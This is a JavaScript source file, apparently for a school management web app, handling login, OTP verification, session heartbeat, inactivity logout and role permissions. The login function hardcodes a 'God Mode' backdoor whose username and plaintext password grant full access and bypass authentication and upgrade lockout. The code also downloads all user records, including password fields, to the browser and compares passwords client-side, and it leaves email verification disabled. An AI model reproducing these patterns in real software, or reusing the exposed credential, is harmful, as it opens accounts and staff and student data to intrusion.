window.cancelChiefAdminVerification = function() {
    if (window.resolveChiefAdminVerification) {
        window.resolveChiefAdminVerification(false);
        window.resolveChiefAdminVerification = null;
    }
    const modal = document.getElementById('chiefAdminVerificationModal');
    if (modal) modal.style.display = 'none';
};

window.requestChiefAdminVerification = async function(userId) {
    const modal = document.getElementById('chiefAdminVerificationModal');
    const message = document.getElementById('chiefAdminVerificationMessage');
    const otpInput = document.getElementById('chiefAdminOtpInput');
    const verifyButton = document.getElementById('chiefAdminVerifyButton');
    const resendButton = document.getElementById('chiefAdminResendButton');
    if (!modal || !otpInput || !verifyButton || !resendButton) {
        return false;
    }

    const readJsonResponse = async (response) => {
        const text = await response.text();
        try {
            return text ? JSON.parse(text) : {};
        } catch (_) {
            throw new Error(
                'The verification service is not available. Confirm that the Netlify function is deployed and open the function URL in a browser.'
            );
        }
    };

    const sendCode = async () => {
        message.textContent = 'Sending a new verification code...';
        resendButton.disabled = true;
        verifyButton.disabled = true;
        try {
            const response = await fetch('/.netlify/functions/chief-admin-auth', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ action: 'send', userId })
            });
            const result = await readJsonResponse(response);
            if (!response.ok) throw new Error(result.error || 'Could not send the verification code.');
            message.textContent = `Enter the 6-digit code sent to ${result.maskedEmail || 'the administrator email'} (expires in 10 minutes).`;
        } catch (error) {
            message.textContent = error.message;
        } finally {
            resendButton.disabled = false;
            verifyButton.disabled = false;
        }
    };

    otpInput.value = '';
    modal.style.display = 'flex';
    await sendCode();

    return new Promise((resolve) => {
        window.resolveChiefAdminVerification = resolve;

        verifyButton.onclick = async () => {
            const code = otpInput.value.replace(/\D/g, '');
            if (!/^\d{6}$/.test(code)) {
                message.textContent = 'Enter exactly 6 digits.';
                return;
            }
            verifyButton.disabled = true;
            message.textContent = 'Verifying code...';
            try {
                const response = await fetch('/.netlify/functions/chief-admin-auth', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ action: 'verify', userId, code })
                });
                const result = await readJsonResponse(response);
                if (!response.ok) throw new Error(result.error || 'Verification failed.');
                modal.style.display = 'none';
                window.resolveChiefAdminVerification = null;
                resolve(true);
            } catch (error) {
                message.textContent = error.message;
                verifyButton.disabled = false;
            }
        };

        resendButton.onclick = sendCode;
    });
};

// 2. The Merged Login Function
window.attemptLogin = async function() {
    console.log("Login clicked!");
    const loginStartedAt = performance.now();
    const uInput = document.getElementById('loginUser').value.trim();
    const pInput = document.getElementById('loginPass').value;

    // 🌟 Check if God is knocking at the door
    const isGodModeAttempt = (uInput === "Jayden" && pInput === "vicsim291183");

    // Block login immediately if the system is in upgrade mode, UNLESS it is God Mode
    if (window.settings && window.settings.upgradeMode === true && !isGodModeAttempt) {
        if (typeof window.triggerUpgradeMode === 'function') window.triggerUpgradeMode();
        return;
    }

    const loginBtn = document.querySelector('#loginScreen button');
    const originalBtnText = loginBtn ? loginBtn.innerText : "Secure Login";
    if (window.loginInProgress) return;
    window.loginInProgress = true;
    window.appDataReady = false;
    window.loginCloudUsers = null;
    if (loginBtn) loginBtn.disabled = true;
    const resetLoginAttempt = () => {
        window.loginInProgress = false;
        if (loginBtn) {
            loginBtn.disabled = false;
            loginBtn.innerText = originalBtnText;
        }
    };

    // --- 🌟 GOD MODE INTERCEPTOR 🌟 ---
    if (isGodModeAttempt) {
        const godUser = { id: "DEV_001", user: "Jayden", username: "Jayden", password: "vicsim291183", role: "God Mode", permissions: "all", sessionId: "GOD-MODE" };
        localStorage.setItem('currentUser', JSON.stringify(godUser));
        window.currentUser = godUser;

        if(document.getElementById('currentUserStatusBox')) {
            document.getElementById('currentUserStatusBox').style.display = 'block';
            document.getElementById('sidebarUserName').innerText = window.currentUser.user;
        }

        if (typeof window.evaluateGodModeUI === 'function') window.evaluateGodModeUI(window.currentUser);
        if (typeof applyUserRole === 'function') applyUserRole("God Mode");

        document.getElementById('loginScreen').style.display = 'none';
        window.startUserInactivityMonitor();
        if (typeof window.loadSchoolAssets === 'function') {
            window.loadSchoolAssets().catch(error => console.error('School asset startup load failed:', error));
        }
        window.appInitializationPromise = window.initializeApp();
        window.appInitializationPromise.catch(error => console.error('Background cloud initialization failed:', error));
        if (typeof window.recordVisit === 'function') {
            window.recordVisit(godUser.user, godUser.role, 'System Visit', 'System login');
        }
        resetLoginAttempt();

        return; 
    }
    // --- END GOD MODE ---

    try {
        if (!navigator.onLine) throw new Error("An active internet connection is required before the system can open.");
        if (loginBtn) loginBtn.innerText = "☁️ Checking Cloud...";

        let { data: cloudUsers, error, count } = await window.supabaseClient
            .from('users')
            .select('*', { count: 'exact' });
        if (error) throw new Error("Supabase rejected the request: " + error.message);
        cloudUsers = cloudUsers || [];
        if (count === null || count === undefined) throw new Error('The system could not verify the staff account list.');
        if (cloudUsers.length !== count) cloudUsers = await window.fetchCompleteCloudTable('users');
        console.info(`[Startup] Account verification completed in ${((performance.now() - loginStartedAt) / 1000).toFixed(1)}s`);

        if (loginBtn) loginBtn.innerText = "🔐 Verifying...";

        const cleanUser = uInput.toLowerCase();
        const cleanPass = pInput.trim(); 

        const foundUser = cloudUsers.find(u => {
            // 🛑 FIX: Look at main SQL columns first for login checking
            const dbUser = (u.username || u.name || (u.data ? (u.data.username || u.data.user || u.data.name) : "")).toLowerCase();
            const dbPass = u.password_hash || (u.data ? (u.data.pass || u.data.password) : "");
            return dbUser === cleanUser && dbPass === cleanPass;
        });

        if (foundUser) {
            if (loginBtn) loginBtn.innerText = "✅ Loading Dashboard...";
            let userData = foundUser.data;
            if (typeof userData === 'string') {
                try {
                    userData = JSON.parse(userData);
                } catch (parseError) {
                    console.warn('Staff account data was not valid JSON; starting with empty session metadata.', parseError);
                    userData = {};
                }
            }
            if (!userData || typeof userData !== 'object' || Array.isArray(userData)) userData = {};
            foundUser.data = userData;

            // 🛑 FIX: Look at main SQL columns first for roles
            let determinedRole = foundUser.role || (foundUser.data ? foundUser.data.role : "Level 1"); 
            if(determinedRole === "Admin") determinedRole = "Level 2"; 
            if(determinedRole === "Chief Admin") determinedRole = "Level 3"; 

            // Email verification is temporarily disabled.
            // Restore it later by re-enabling the Chief Admin verification call.

            const sessionId = "SESS-" + Date.now() + "-" + Math.random().toString(36).substr(2, 5);

            // 🛑 FIX: Assign the top-level SQL name to the dashboard sidebar
            window.currentUser = {
                id: foundUser.id,
                user: foundUser.name || foundUser.username || (foundUser.data ? (foundUser.data.name || foundUser.data.user) : "User"),
                username: foundUser.username || (foundUser.data ? foundUser.data.username : cleanUser),
                role: determinedRole,
                sessionId: sessionId 
            }; 

            localStorage.setItem('currentUser', JSON.stringify(window.currentUser));
            window.loginCloudUsers = cloudUsers;

            foundUser.data.active_session = sessionId;
            foundUser.data.last_seen = new Date().toISOString();
            const { data: savedSession, error: sessionError } = await window.supabaseClient
                .from('users')
                .update({ data: foundUser.data })
                .eq('id', foundUser.id)
                .select('id, data')
                .maybeSingle();
            if (sessionError) {
                throw new Error('The login session could not be secured: ' + sessionError.message);
            }
            let savedSessionData = savedSession?.data;
            if (typeof savedSessionData === 'string') {
                try {
                    savedSessionData = JSON.parse(savedSessionData);
                } catch (_) {
                    savedSessionData = {};
                }
            }
            if (savedSessionData?.active_session !== sessionId) {
                throw new Error('The login session could not be confirmed. Please try again.');
            }
            if (typeof window.logActivity === 'function') window.logActivity("Login", "User authenticated successfully via Cloud");
            if (typeof window.recordVisit === 'function') {
                window.recordVisit(window.currentUser.user, window.currentUser.role, 'System Visit', 'System login');
            }

            // 🛑 CRITICAL FIX: Update UI status, but DO NOT hide the login screen yet.
            if(document.getElementById('currentUserStatusBox')) {
                document.getElementById('currentUserStatusBox').style.display = 'block';
                document.getElementById('sidebarUserName').innerText = window.currentUser.user;
            }

            if (typeof window.evaluateGodModeUI === 'function') window.evaluateGodModeUI(window.currentUser);
            if (typeof applyUserRole === 'function') applyUserRole(determinedRole);
            document.getElementById('loginScreen').style.display = 'none';
            window.startUserInactivityMonitor();

            if (typeof window.fetchOnlineUsers === 'function') {
                window.fetchOnlineUsers(cloudUsers).catch(fetchError => console.error('Online-user startup refresh failed:', fetchError));
            }
            if (typeof window.loadSchoolAssets === 'function') {
                window.loadSchoolAssets().catch(assetError => console.error('School asset startup load failed:', assetError));
            }
            if (typeof window.startSessionHeartbeat === 'function') window.startSessionHeartbeat();

            window.appInitializationPromise = window.initializeApp();
            window.appInitializationPromise.catch(initError => console.error('Background cloud initialization failed:', initError));
            resetLoginAttempt();

        } else {
            // Found NO user with these credentials
            alert("❌ Invalid Credentials! Please check your username and password.");
            resetLoginAttempt();
        }

    } catch (err) {
        console.error("LOGIN CRASH (Network Error):", err);
        window.appDataReady = false;
        document.getElementById('loginScreen').style.display = 'flex';
        if (document.getElementById('currentUserStatusBox')) document.getElementById('currentUserStatusBox').style.display = 'none';
        window.currentUser = null;
        localStorage.removeItem('currentUser');
        window.showCloudLoadFailure(err);
        resetLoginAttempt();
    }
};

window.logout = async function() {
    const userLoggingOut = window.currentUser;
    const localSessionId = userLoggingOut ? userLoggingOut.sessionId : null;
    window.appInitializationGeneration = (window.appInitializationGeneration || 0) + 1;
    window.startupLoadProgress = null;
    window.loginCloudUsers = null;
    window.pendingAppNavigation = null;
    const startupBanner = document.getElementById('startupSyncBanner');
    if (startupBanner) startupBanner.style.display = 'none';
    if (typeof window.setAppDataInteractivity === 'function') window.setAppDataInteractivity(false);
    window.stopUserInactivityMonitor();
    if (window.sessionInterval) {
        clearInterval(window.sessionInterval);
        window.sessionInterval = null;
    }

    window.currentUser = null;
    window.appDataReady = false;
    localStorage.removeItem('currentUser');

    const usernameInput = document.getElementById('loginUser');
    const passwordInput = document.getElementById('loginPass');
    const showPasswordInput = document.querySelector('#loginScreen .show-password-label input');
    if (usernameInput) usernameInput.value = '';
    if (passwordInput) {
        passwordInput.value = '';
        passwordInput.type = 'password';
    }
    if (showPasswordInput) showPasswordInput.checked = false;
    const loginScreen = document.getElementById('loginScreen');
    if (loginScreen) loginScreen.style.display = 'flex';
    const statusBox = document.getElementById('currentUserStatusBox');
    if (statusBox) statusBox.style.display = 'none';

    // Clear the remote session after locking the local screen.
    if (userLoggingOut && userLoggingOut.id && typeof window.supabaseClient !== 'undefined') {
        try {
            const { data } = await window.supabaseClient.from('users').select('*').eq('id', userLoggingOut.id).single();
            if (data && data.data) {
                if (!localSessionId || data.data.active_session === localSessionId) {
                    data.data.active_session = null;
                    data.data.last_seen = null;
                    await window.supabaseClient.from('users').update({ data: data.data }).eq('id', userLoggingOut.id);
                }
                if (typeof window.logActivity === 'function') window.logActivity("Logout", "User logged out manually");
            }
        } catch(e) { 
            console.warn("Could not sync logout to cloud", e); 
        }
    }
};

window.stopUserInactivityMonitor = function() {
    clearTimeout(window.inactivityWarningTimer);
    clearTimeout(window.inactivityLogoutTimer);
    window.inactivityWarningTimer = null;
    window.inactivityLogoutTimer = null;
    const warning = document.getElementById('inactivityWarning');
    if (warning) warning.remove();
};

window.resetUserInactivityMonitor = function() {
    if (!window.currentUser) return;
    window.stopUserInactivityMonitor();
    window.inactivityWarningTimer = setTimeout(() => {
        if (!window.currentUser) return;
        if (!document.getElementById('inactivityWarning')) {
            const warning = document.createElement('div');
            warning.id = 'inactivityWarning';
            warning.style.cssText = 'position:fixed; inset:0; z-index:10000000; display:flex; align-items:center; justify-content:center; background:rgba(0,0,0,0.68); backdrop-filter:blur(5px); font-family:Segoe UI,Tahoma,sans-serif;';
            warning.innerHTML = `
                <div style="max-width:420px; width:calc(100% - 40px); padding:28px; border-radius:10px; background:#fff; text-align:center; box-shadow:0 8px 30px rgba(0,0,0,.35);">
                    <h2 style="margin:0 0 12px; color:#2c3e50;">Session inactivity</h2>
                    <p style="margin:0 0 20px; line-height:1.5; color:#34495e;">You will be logged out in one minute due to inactivity. Choose below to continue your session.</p>
                    <button id="staySignedInBtn" class="btn-standard btn-primary" style="width:100%;">Stay signed in</button>
                </div>`;
            document.body.appendChild(warning);
            document.getElementById('staySignedInBtn').addEventListener('click', window.resetUserInactivityMonitor);
        }
        window.inactivityLogoutTimer = setTimeout(() => {
            if (!window.currentUser) return;
            window.logout();
            alert('You were logged out after 20 minutes of inactivity. Please log in again.');
        }, 60 * 1000);
    }, 19 * 60 * 1000);
};

window.startUserInactivityMonitor = function() {
    window.resetUserInactivityMonitor();
};

['pointerdown', 'pointermove', 'keydown', 'touchstart', 'scroll', 'input'].forEach(eventName => {
    document.addEventListener(eventName, () => {
        const now = Date.now();
        if (
            window.currentUser &&
            !document.getElementById('inactivityWarning') &&
            (eventName !== 'pointermove' || now - (window.lastInactivityActivityAt || 0) >= 1000)
        ) {
            window.lastInactivityActivityAt = now;
            window.resetUserInactivityMonitor();
        }
    }, { passive: true });
});

// 🎯 NEW: Background Session Protector
window.startSessionHeartbeat = function() {
    if (window.sessionInterval) {
        clearInterval(window.sessionInterval);
        window.sessionInterval = null;
    }

    if (!window.currentUser || !window.currentUser.id || !window.supabaseClient) return;
    window.sessionHeartbeatStartedAt = Date.now();

    const checkRemoteSession = async () => {
        if (!window.currentUser || !window.currentUser.sessionId) return;
        try {
            const { data, error } = await window.supabaseClient
                .from('users')
                .select('*')
                .eq('id', window.currentUser.id)
                .single();
            if (error) throw error;

            let userData = data && data.data;
            if (typeof userData === 'string') {
                try {
                    userData = JSON.parse(userData);
                } catch (_) {
                    userData = {};
                }
            }
            userData = userData && typeof userData === 'object' ? userData : {};

            userData.active_session = window.currentUser.sessionId;
            userData.last_seen = new Date().toISOString();
            await window.supabaseClient
                .from('users')
                .update({ data: userData })
                .eq('id', window.currentUser.id);
        } catch (error) {
            console.warn('Session heartbeat failed:', error.message || error);
        }
    };

    checkRemoteSession();
    window.sessionInterval = setInterval(checkRemoteSession, 15000);
};

// POWERFUL 3-TIER PERMISSION SYSTEM
window.applyPermissions = function() {
    if (!window.currentUser || !window.currentUser.role) return; 

    const role = window.currentUser.role;
    console.log("Applying rules for role:", role);

    const isChiefAdmin = role.includes('Level 3') || role === 'Chief Admin';
    const isAdmin = role.includes('Level 2') || role === 'Admin' || isChiefAdmin;
    const isTeacher = role.includes('Level 1') || role === 'Teacher';

    // 1. Level 2 & 3 Access (Admin Elements)
    const adminOnlyElements = document.querySelectorAll('.admin-only');
    adminOnlyElements.forEach(el => {
        el.style.display = isAdmin ? '' : 'none'; // Unhides element while preserving CSS flex/grid
    });

    // 2. Level 3 Access Only (Danger Zone / Factory Reset)
    const chiefAdminElements = document.querySelectorAll('.chief-admin-only');
    chiefAdminElements.forEach(el => {
        el.style.display = isChiefAdmin ? '' : 'none';
    });
};

window.requireAdmin = function(actionCallback) {
    if (!window.currentUser) return;
    
    const role = window.currentUser.role;
    const isAtLeastAdmin = role.includes('Level 2') || role.includes('Level 3') || role === 'Admin' || role === 'Chief Admin';

    if (isAtLeastAdmin) {
        actionCallback(); 
    } else {
        customPrompt("PERMISSION DENIED: Please enter an Admin Password to proceed:", function(override) {
            const adminMatch = window.users.some(u => {
                const uRole = u.role || "";
                const validRole = uRole.includes('Level 2') || uRole.includes('Level 3') || uRole === 'Admin' || uRole === 'Chief Admin';
                return validRole && u.pass === override;
            });
            
            if (adminMatch) actionCallback();
            else alert("Override Failed. Action Cancelled.");
        });
    }
};

window.formatWhatsAppPhone = function(phone) {
    let cleaned = phone.replace(/\D/g, ''); 
    if (cleaned.startsWith('0')) {
        cleaned = '263' + cleaned.substring(1); 
    }
    return cleaned;
};

